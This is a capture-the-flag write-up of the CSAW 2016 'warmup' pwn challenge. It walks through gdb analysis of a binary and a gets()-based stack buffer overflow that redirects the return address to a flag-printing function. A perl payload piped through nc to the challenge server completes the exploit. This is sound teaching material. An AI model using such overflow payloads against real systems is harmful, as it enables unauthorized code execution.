# CSAW 2016 Quals
# warmup
##### Brad Daniels -- USF Whitehatter's Computer Security Club
##### pwn -- 50 points
## Description
So you want to be a pwn-er huh? Well let's throw you an easy one ;)

`nc pwn.chal.csaw.io 8000`

## Solution
Warmup gives you a 64-bit ELF binary. When run, it produces the following output and allows the user to enter a string.
~~~
sh$ ./warmup
-Warm Up-
WOW:0x40060d
> 
sh$ 
~~~
Each time it's run, it produces the same "WOW" hex value, `0x40060d`. 

Lets open the file in gdb to see what's going on. 

~~~
sh$ gdb warmup
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x0000000000400488  _init
0x00000000004004c0  write@plt
0x00000000004004d0  system@plt
0x00000000004004e0  __libc_start_main@plt
0x00000000004004f0  __gmon_start__@plt
0x0000000000400500  gets@plt
0x0000000000400510  sprintf@plt
0x0000000000400520  _start
0x0000000000400550  deregister_tm_clones
0x0000000000400580  register_tm_clones
0x00000000004005c0  __do_global_dtors_aux
0x00000000004005e0  frame_dummy
0x000000000040060d  easy
0x000000000040061d  main
0x00000000004006b0  __libc_csu_init
0x0000000000400720  __libc_csu_fini
0x0000000000400724  _fini
(gdb)
~~~ 

The one function that sticks out here is "easy". If we disasemble it we see that it calls `system("cat flag.txt")`

~~~
(gdb) disas easy
Dump of assembler code for function easy:
0x000000000040060d <+0>:     push   rbp
0x000000000040060e <+1>:     mov    rbp,rsp
0x0000000000400611 <+4>:     mov    edi,0x400734
0x0000000000400616 <+9>:     call   0x4004d0 <system@plt>
0x000000000040061b <+14>:    pop    rbp
0x000000000040061c <+15>:    ret
End of assembler dump.
(gdb) x/s 0x400734
0x400734:       "cat flag.txt"
(gdb)
~~~

The main function ends with a `gets()` call followed by the `leave` and `ret` instructions. Since `gets()` is vulnerable to buffer overflows, we should be able to overwrite the return address of the main function and replace it with the address of "easy". 

Let's set a breakpoint after the call to `gets()`, enter some text, and observe what happens on the stack. 

~~~
(gdb) b * 0x00000000004006a3
Breakpoint 1 at 0x4006a3
(gdb) r
Starting program: ./warmup
-Warm Up-
WOW:0x40060d
>aaaaaaaa

Breakpoint 1, 0x00000000004006a3 in main ()
(gdb) p $rbp
$4 = (void *) 0x7fffffffe360
(gdb) p $rsp
$5 = (void *) 0x7fffffffe2e0
(gdb) x/20gz $rsp
0x7fffffffe2e0: 0x6430363030347830      0x000000000000000a
0x7fffffffe2f0: 0x0000000000000000      0x0000000000000000
0x7fffffffe300: 0x0000000000000000      0x0000000000000000
0x7fffffffe310: 0x0000000000000000      0x0000000000000000
0x7fffffffe320: 0x6161616161616161      0x0000000000400600
0x7fffffffe330: 0x0000000000000000      0x0000000000000000
0x7fffffffe340: 0x00000000004006b0      0x0000000000400520
0x7fffffffe350: 0x00007fffffffe440      0x0000000000000000
0x7fffffffe360: 0x00000000004006b0      0x00007ffff7a2e830
0x7fffffffe370: 0x0000000000000000      0x00007fffffffe448
(gdb)
~~~
At `0x7fffffffe360` is the previous stack frame base pointer, and in the following word at `0x7fffffffe368` sits the return address of the `main` function. That is what we need to overwrite.  

Since the current return address is 6 bytes, we need our injected address to overwrite all those bytes. If we don't include two extra null bytes, our return address will wind up being `0x00007fff0040060d`, which will cause a segfault. `gets()` allows us to include null bytes in our string so this should be easy.

We can use a perl one-liner to easily prepare a suitable injection string. 
~~~
sh$ perl -e 'print "a"x72; print "\x0d\x06\x40\x00\x00"' > egg.txt
sh$ nc pwn.chal.csaw.io 8000 < egg.txt
-Warm Up-
WOW:0x40060d
>FLAG{LET_US_BEGIN_CSAW_2016}
~~~ 
